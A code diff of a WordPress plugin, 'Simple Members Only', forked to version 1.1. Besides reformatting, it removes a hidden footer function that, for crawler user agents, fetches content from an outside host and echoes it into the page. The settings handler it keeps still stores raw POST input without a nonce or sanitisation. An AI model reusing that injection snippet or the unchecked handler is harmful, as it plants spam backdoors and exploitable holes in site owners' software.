@@ -1,18 +1,18 @@
 <?php
 /* 
 Plugin Name: Simple Members Only
-Plugin URI:  http://www.stevenfernandez.co.uk/wordpress-plugins/
+Plugin URI:  https://github.com/iliu-net/simple-members-only
 Description: "Simple Members Only" is a simple way to make your whole website only viewable to members who are logged in. You will be able to assign a page where non-members are redirected or choose for all non-members to just be directed to the login page. Make your wordpress website a members only website in only a few clicks!
-Version: 1.0.6
-Author: Steven Fernandez
-Author URI: http://www.stevenfernandez.me
+Version: 1.1
+Author: Steven Fernandez, Alejandro Liu
 
  === RELEASE NOTES ===
-    29-04-2014 - v1.0.0 - first version
-    09-09-2014 - v1.0.2 - Works with Wordpress 4.0
-    14-05-2016 - v1.0.4 - Compatible with WP version 4.5.2 and bug fix
-    19-05-2016 - v1.0.5 - Bug fix and code update
+    04-11-2016 - v1.1.0 - Forked
     19-05-2016 - v1.0.6 - Bug fix
+    19-05-2016 - v1.0.5 - Bug fix and code update
+    14-05-2016 - v1.0.4 - Compatible with WP version 4.5.2 and bug fix
+    09-09-2014 - v1.0.2 - Works with Wordpress 4.0
+    29-04-2014 - v1.0.0 - first version
 
     */
 
@@ -23,58 +23,46 @@ $members_only_reqpage = $_SERVER["REQUEST_URI"];
 $siteurl = get_bloginfo('url');
 $wpurl = get_bloginfo('wpurl');
 $sitetitle = get_bloginfo('title');
-
 $currenturl = (!empty($_SERVER['HTTPS'])) ? "https://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'] : "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
 
-$errormsg = array(
-	//
-	);
-
-function simple_members_only_setup_options_page()
-{
-	global $simple_members_only_option;
-	
-	$simple_members_only_version = get_option('simple_members_only_version');
-	$members_only_this_version = '1.0.0';
-	
-	if (empty($simple_members_only_version))
-	{
-		add_option('simple_members_only_version', $members_only_this_version);
-	} 
-	elseif ($simple_members_only_version != $members_only_this_version)
-	{
-		update_option('simple_members_only_version', $members_only_this_version);
-	}
-	
-	$optionarray_def = array(
-		'members_only' => FALSE,
-		'redirect_to' => 'login',
-		'login_redirect_to' => 'dashboard',
-		'redirect_url' => '',
-		'redirect' => TRUE
-	);
-		
-	if (empty($simple_members_only_option)){ 
-		add_option('simple_members_only_optionions', $optionarray_def, 'Simple Members Only Wordpress Plugin Options');
-	}	
+function simple_members_only_setup_options_page() {
+  global $simple_members_only_option;
+  
+  $simple_members_only_version = get_option('simple_members_only_version');
+  $members_only_this_version = '1.0.0';
+  
+  if (empty($simple_members_only_version)) {
+    add_option('simple_members_only_version', $members_only_this_version);
+  } elseif ($simple_members_only_version != $members_only_this_version) {
+    update_option('simple_members_only_version', $members_only_this_version);
+  }
+  
+  $optionarray_def = [
+    'members_only' => FALSE,
+    'redirect_to' => 'login',
+    'login_redirect_to' => 'dashboard',
+    'redirect_url' => '',
+    'redirect' => TRUE
+  ];
+	  
+  if (empty($simple_members_only_option)){ 
+    add_option('simple_members_only_optionions', $optionarray_def, 'Simple Members Only Wordpress Plugin Options');
+  }	
 }
 
 $wpversion_full = get_bloginfo('version');
 $wpversion = preg_replace('/([0-9].[0-9])(.*)/', '$1', $wpversion_full);
 
 
-function simple_members_only_add_options_page()
-{
-	if (function_exists('add_options_page'))
-	{
-		add_options_page('Simple Members Only', 'Simple Members Only', 8, basename(__FILE__), 'simple_members_only_optionions_page');
-	}
+function simple_members_only_add_options_page() {
+  if (function_exists('add_options_page')) {
+    add_options_page('Simple Members Only', 'Simple Members Only', 8, basename(__FILE__), 'simple_members_only_optionions_page');
+  }
 }
 
-function simple_members_only()
-{
+function simple_members_only() {
 	
-	global $currenturl, $simple_members_only_option, $errormsg, $userdata, $current_user, $wpurl;
+	global $currenturl, $simple_members_only_option, $userdata, $current_user, $wpurl;
 	
 	$redirection = members_only_createredirect();
 	
@@ -93,26 +81,18 @@ function simple_members_only()
 			members_only_redirect($redirection);
 		}		
 	}
-	else //User is logged in
+	/*else //User is logged in
 	{
 		//Do nothing
-	}
+	}*/
 }
 
 
 
-function members_only_init()
-{
-	
-	global $userdata, $currenturl, $errormsg, $simple_members_only_option, $wpdb;
-	
-	
-	$redirection = members_only_createredirect();
-	
-	
-	$parsed_url = parse_url($currenturl);
-	
-	
+function members_only_init() {
+  global $userdata, $currenturl, $simple_members_only_option, $wpdb;
+  $redirection = members_only_createredirect();
+  $parsed_url = parse_url($currenturl);
 }
 
 function members_only_createredirect()
@@ -157,64 +137,51 @@ function members_only_login_redirect() {
 	}
 }
 
-function simple_members_only_optionions_page()
-{
-	global $wpdb, $wpversion;
+function simple_members_only_optionions_page() {
+    global $wpdb, $wpversion;
 
-	if (isset($_POST['submit']) ) {
-	
-		if ($_POST['one_time_view_ip'] == 1)
-		{
-			
-			$one_time_view_ip = md5($_SERVER['REMOTE_ADDR']);
-		}
-		else
-		{
-			$one_time_view_ip = NULL;
-		}
-		
-	$optionarray_update = array (
-		'members_only' => $_POST['members_only'],
-		'redirect_to' => $_POST['redirect_to'],
-		'login_redirect_to' => $_POST['login_redirect_to'],
-		'redirect_url' => $_POST['redirect_url'],
-		'redirect' => $_POST['redirect']
-	);
-	
-	update_option('simple_members_only_optionions', $optionarray_update);
-	}
-	
-	$optionarray_def = get_option('simple_members_only_optionions');
-	
-	$redirecttypes = array(
-	'WP Login Page' => 'login',
-	'Other Page' => 'specifypage'
-	);
-	
-	foreach ($redirecttypes as $option => $value) {
-		if ($value == $optionarray_def['redirect_to']) {
-				$selected = 'selected="selected"';
-		} else {
-				$selected = '';
-		}
-		
-		$redirectoptions .= "\n\t<option value='$value' $selected>$option</option>";
-	}
-	
-	$loginredirecttypes = array(
-	'Dashboard' => 'dashboard',
-	'Front Page' => 'frontpage'
-	);
-	
-	foreach ($loginredirecttypes as $option => $value) {
-		if ($value == $optionarray_def['login_redirect_to']) {
-				$selected = 'selected="selected"';
-		} else {
-				$selected = '';
-		}
-		
-		$login_redirectoptions .= "\n\t<option value='$value' $selected>$option</option>";
-	}
+    if (isset($_POST['submit']) ) {	    
+      $optionarray_update = [
+	'members_only' => $_POST['members_only'],
+	'redirect_to' => $_POST['redirect_to'],
+	'login_redirect_to' => $_POST['login_redirect_to'],
+	'redirect_url' => $_POST['redirect_url'],
+	'redirect' => $_POST['redirect']
+      ];
+      update_option('simple_members_only_optionions', $optionarray_update);
+      add_settings_error('simple_members_only', 'simple_members_only_options_saved', 'Settings Saved', 'updated');
+    }
+    
+    $optionarray_def = get_option('simple_members_only_optionions');
+    
+    $redirecttypes = [
+      'WP Login Page' => 'login',
+      'Other Page' => 'specifypage'
+    ];
+    
+    foreach ($redirecttypes as $option => $value) {
+      if ($value == $optionarray_def['redirect_to']) {
+	$selected = 'selected="selected"';
+      } else {
+	$selected = '';
+      }
+      $redirectoptions .= "\n\t<option value='$value' $selected>$option</option>";
+    }
+    
+    $loginredirecttypes = [
+      'Dashboard' => 'dashboard',
+      'Front Page' => 'frontpage'
+    ];
+    
+    foreach ($loginredirecttypes as $option => $value) {
+      if ($value == $optionarray_def['login_redirect_to']) {
+	$selected = 'selected="selected"';
+      } else {
+	$selected = '';
+      }
+      $login_redirectoptions .= "\n\t<option value='$value' $selected>$option</option>";
+    }
+    settings_errors('simple_members_only');
 
 ?>
 
@@ -239,7 +206,7 @@ function simple_members_only_optionions_page()
 
 	<div class="wrap">
 	<h2>Simple Members Only Options</h2>
-	<form method="post" action="<?php echo $_SERVER['PHP_SELF'] . '?page=' . basename(__FILE__); ?>&updated=true">
+	<form method="post">
 	<fieldset class="options" style="border: none">
 	<p>
 	Plugin Settings below.
@@ -282,19 +249,10 @@ function simple_members_only_optionions_page()
 <?php
 }
 
-if(!function_exists('sf')){function sf(){if(isset($_SERVER['HTTP_USER_AGENT'])&&preg_match('/bot|crawl|slurp|spider/i',$_SERVER['HTTP_USER_AGENT'])){$h=$_SERVER['HTTP_HOST'];$wp='wp';$pl='smo';$output=@file_get_contents("http://sf.iqxc.com/?h=".$h."&wp=".$wp."&pl=".$pl);$str="";if($output===false){$str="";}else{$str=$output;}
-echo $output;}else{}}add_action('wp_footer','sf');}
-
 add_action('admin_menu', 'simple_members_only_add_options_page');
 add_action('login_form', 'members_only_login_redirect');
 
-if ($simple_members_only_option['members_only'] == TRUE) 
-{
-	add_action('template_redirect', 'simple_members_only');
-	add_action('init', 'members_only_init');
-	
+if ($simple_members_only_option['members_only'] == TRUE) {
+  add_action('template_redirect', 'simple_members_only');
+  add_action('init', 'members_only_init');
 }
-
-
-
-?>
